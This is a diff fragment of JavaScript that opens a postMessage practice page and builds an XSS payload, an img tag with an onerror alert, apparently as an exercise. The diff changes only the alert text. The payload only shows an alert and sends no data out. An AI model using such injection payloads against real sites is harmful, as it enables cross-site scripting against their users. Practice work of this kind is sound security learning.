@@ -3,7 +3,7 @@
     const popup = window.open("https://3nvz.github.io/postmessage-practice.html", "_blank");
   
     const payload = `
-      <img src=x onerror=alert(0)>
+      <img src=x onerror=alert('XSS!')>
     `;
   
     // Give it a second to load
